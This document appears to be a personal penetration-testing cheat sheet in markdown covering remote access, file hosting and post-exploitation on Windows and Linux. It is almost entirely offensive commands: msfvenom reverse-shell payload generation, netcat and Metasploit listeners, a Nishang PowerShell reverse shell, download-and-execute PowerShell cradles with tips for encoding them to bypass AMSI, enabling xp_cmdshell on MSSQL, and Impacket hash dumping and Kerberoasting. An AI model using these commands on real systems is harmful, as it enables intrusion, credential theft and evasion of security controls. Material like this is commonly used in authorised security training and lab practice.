# Remote Access
```
evil-winrm -i {IP} -u {username} -p {password/NTLM hash}

upload {local_filename} {destination_filename (optional)}
download {remote_filename} {destination_filename (optional)}
```
> evil win-rm
> only for windows pro or windows with RDP!!! >.<
> powershell commands can be executed

# Hosting Servers

## HTTP server
```
python3 -m http.server 80
```
> make sure to be in the directory of the server
> --directory can be used

## SMB server
```
sudo smbserver {share name} -username user -password password

net use \\{IP}\{share name} /user:user password

```
> -smb2support might be needed for some windows

## SMB 
```
smbclient -L //(IP)/{share name} 
get > download {filename}
get > uppload {filename}
smbclient -L //{IP}
```

# Reverse Shells

## Listening port
> port 1234, 4444
```
nc -lvnp 4444
rlwrap nc -lvnp 4444

use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
```
> rlwrap allows users to use previous commands 


## Msfvenom
>Take note anything with meterpreter is for msfconsole multihandler

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST={IP} LPORT=4444 -f exe > reverse.exe
msfvenom -p windows/meterpreter/reverse_tcp LHOST={IP} LPORT=4444 -f dll > reverse.dll
msfvenom -p windows/shell_reverse_tcp LHOST={IP} LPORT=4444 -f exe > reverse.exe
msfvenom -p windows/shell/reverse_tcp LHOST={IP} LPORT=4444 -f dll > reverse.dll
```
> windows .exe & .dll

```
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.0.1 LPORT=4444 -f elf >reverse.elf
msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.0.1 LPORT=4444 -f elf >reverse.elf
```
> linux

## Nishang 
```
import-module Invoke-PowerShellTcp.ps1
Invoke-PowerShellTcp -Reverse -IPAddress {LHOST} -Port 4444
```

# Powershell 

## Downloading files
```
powershell.exe IEX (New-Object Net.WebClient).DownloadString("{IP/website url}")
```
> download and execute 
> you can encode using https://amsi.fail/ to bypass

```
IEX((New-Object Net.WebClient).DownloadString("{IP/website url}"))
```
> download
> you can encode using https://raikia.com/tool-powershell-encoder/ to bypass

```
powershell.exe -e 
```
> execute using powershell 
> e.g. powershell.exe -e (encoded stuff)


## check OS version
```
[Environment]::Is64BitProcess
(Get-WmiObject Win32_OperatingSystem).OSArchitecture
```
> checking OS architecture 


## MSSQL
```
enable_xp_cmdshell
EXEC xp+cmdshell '{command}'
```
> summons interactive shell / cmd for MSSQL


# Impacket

## Hash dump
```
secretsdump.py '{username}@{IP}'
```
> hash dump 

## Kerberoasting + hash via SPN
```
GetUserSPNs.py -request -{NETBIOSNAME}-ip {IP} {DOMAIN}/{NAME}:{PASSWORD}
```
> - hash dump via keberoasting using SPN
> - Need to hashcat to unveil the hash. Refer to bruteforce on usage
## MS sql logon 
```
mssqlclient.py {username}@{IP}
```
